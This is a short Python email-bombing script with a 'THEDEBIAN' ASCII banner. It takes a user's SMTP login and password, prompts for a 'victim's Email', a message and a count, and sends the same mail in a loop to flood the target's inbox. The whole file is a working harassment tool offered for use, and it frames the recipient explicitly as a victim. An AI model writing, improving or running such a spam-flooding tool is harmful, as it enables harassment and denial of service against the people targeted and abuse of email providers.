
import smtplib
import sys
import os


sys.ps1 = '\033[01;32m'
print(sys.ps1)

os.system('clear || cls')


print('''

████████╗██╗  ██╗███████╗██████╗ ███████╗██████╗ ██╗ █████╗ ███╗   ██╗
╚══██╔══╝██║  ██║██╔════╝██╔══██╗██╔════╝██╔══██╗██║██╔══██╗████╗  ██║
   ██║   ███████║█████╗  ██║  ██║█████╗  ██████╔╝██║███████║██╔██╗ ██║
   ██║   ██╔══██║██╔══╝  ██║  ██║██╔══╝  ██╔══██╗██║██╔══██║██║╚██╗██║
   ██║   ██║  ██║███████╗██████╔╝███████╗██████╔╝██║██║  ██║██║ ╚████║
   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
                                                                      

                                  
                                                                        
''')


print('''

sign in with ur email account

''')

prot = str(input("Enter protocol (smtp.gmail.com for gmail): "))
port10 = int(input(" Enter port (587 for Gmail): "))




uname = input("Enter Your Email: ")
upass = input("Enter Your password: ")
rmail = input("Enter victim\'s Email: ")
message = input("Enter the message you want to send: ")
threads1 = input("Enter The amount of threads you want to send: ")
s = smtplib.SMTP(prot, port10)

s.starttls()

s.login(uname, upass)

msg = message

print("\nspamming "+rmail+" please wait!\n")

for i in range(int(threads1)):
   s.sendmail(uname, rmail, msg)
   
print("spam done!")

s.quit()
